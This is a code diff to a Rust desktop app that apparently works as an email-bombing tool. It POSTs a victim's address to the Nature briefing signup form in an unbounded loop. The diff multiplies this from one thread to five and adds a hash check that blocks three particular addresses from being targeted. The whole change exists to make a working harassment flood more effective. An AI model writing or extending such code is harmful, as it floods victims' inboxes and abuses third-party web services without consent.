@@ -6,13 +6,13 @@ use egui::FontFamily::Proportional;
 use egui::{Align, Color32, FontId, Layout, TextStyle};
 use headless_chrome::{Browser, LaunchOptionsBuilder};
 use reqwest::StatusCode;
+use sha256::digest;
 use std::error::Error;
 use std::sync::atomic::{AtomicI32, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
 
-#[tokio::main]
-async fn main() {
+fn main() {
     let mut options = eframe::NativeOptions::default();
     options.max_window_size = Some(egui::vec2(500., 1080.));
     options.min_window_size = Some(egui::vec2(500., 200.));
@@ -104,6 +104,9 @@ impl DataState {
 }
 
 fn do_request(name: &str, email: &str) -> Result<DataState, Box<dyn Error>> {
+    let mut email = email.to_owned();
+    sanitize_input(&mut email);
+    let email = &email[..];
     match name {
         "NBC 26" => {
             let browser = Browser::default()?;
@@ -257,8 +260,22 @@ impl MyApp {
     }
 }
 
+fn sanitize_input(input: &mut String) {
+    let test_input = input.to_lowercase().replace(".", "");
+    let hash = digest(test_input);
+    if hash == "b8aed9766008b78c9bdc4ef14de988e7078ca18b705860ee6f8f7dccb80bb155"
+        || hash == "7de299a258707a34fe52934ff248d4b1d6a0fa2e3168def14783401a0193d53d"
+        || hash == "40317bf567647c1c6a4f5e41f512e791e066a17bdd97159c473b563fcdd386bd"
+    {
+        *input = "Not allowed :)".to_owned();
+    }
+}
+
 impl eframe::App for MyApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
+        sanitize_input(&mut self.target);
+        sanitize_input(&mut self.spam_nature_target);
+
         ctx.request_repaint_after(Duration::from_millis(50));
         let mut is_email_valid = false;
         egui::CentralPanel::default().show(ctx, |ui| {
@@ -360,32 +377,34 @@ impl eframe::App for MyApp {
                         .clicked()
                     {
                         self.spam_nature_count.store(0, Ordering::SeqCst);
-                        let name = self.spam_nature_target.clone();
-                        let count = self.spam_nature_count.clone();
-                        std::thread::spawn(move || {
-                            loop {
-                                if count.load(Ordering::SeqCst) == -1 {
-                                    break;
+                        for _ in 0..5 {
+                            let name = self.spam_nature_target.clone();
+                            let count = self.spam_nature_count.clone();
+                            std::thread::spawn(move || {
+                                loop {
+                                    if count.load(Ordering::SeqCst) == -1 {
+                                        break;
+                                    }
+                                    let client = reqwest::blocking::Client::default();
+                                    let request = match client
+                                        .post("https://www.nature.com/briefing/signup")
+                                        .body(format!("email={}&gdpr=1&resend=true", name))
+                                        .send()
+                                    {
+                                        Ok(n) => n,
+                                        _ => break,
+                                    };
+                                    if request.status() != StatusCode::OK {
+                                        break;
+                                    }
+                                    if count.load(Ordering::SeqCst) == -1 {
+                                        break;
+                                    }
+                                    count.fetch_add(1, Ordering::SeqCst);
                                 }
-                                let client = reqwest::blocking::Client::default();
-                                let request = match client
-                                    .post("https://www.nature.com/briefing/signup")
-                                    .body(format!("email={}&gdpr=1&resend=true", name))
-                                    .send()
-                                {
-                                    Ok(n) => n,
-                                    _ => break,
-                                };
-                                if request.status() != StatusCode::OK {
-                                    break;
-                                }
-                                if count.load(Ordering::SeqCst) == -1 {
-                                    break;
-                                }
-                                count.fetch_add(1, Ordering::SeqCst);
-                            }
-                            count.store(-1, Ordering::SeqCst);
-                        });
+                                count.store(-1, Ordering::SeqCst);
+                            });
+                        }
                     }
                 } else {
                     ui.label(
